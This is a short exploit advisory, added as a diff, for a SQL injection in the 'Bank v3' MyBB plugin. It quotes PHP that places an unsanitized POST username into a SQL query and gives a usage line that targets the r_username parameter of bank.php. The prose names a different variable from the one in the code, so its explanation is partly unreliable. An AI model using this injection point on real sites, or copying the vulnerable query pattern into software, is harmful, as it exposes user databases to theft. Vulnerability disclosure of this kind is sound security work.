@@ -1,0 +1,22 @@
+# Exploit Title: Bank v3 MyBB plugin SQLi 0day
+# Exploit Author: Red_Hat [NullSec]
+# Software Link: http://mods.mybb.com/download/bank-v3
+# Tested on: Windows & Linux.
+
+Vulnerable code :
+
+<?php
+     $user=$_POST['r_username'];
+     $pay=intval($_POST['r_pay']);
+     $query_r=$db->query("SELECT * FROM ".TABLE_PREFIX."users WHERE username='$user'");
+     $fetch=$db->fetch_array($query_r);
+?>
+
+The variable '$mybb->input['id']' remains unsanitized.
+
+Usage : 
+http://www.site.com/bank.php
+/GET transactions=send
+/POST r_pay=Red_Hat&r_username=[SQLi]
+
+Shoutout to Zixem <3 & NullSec :3
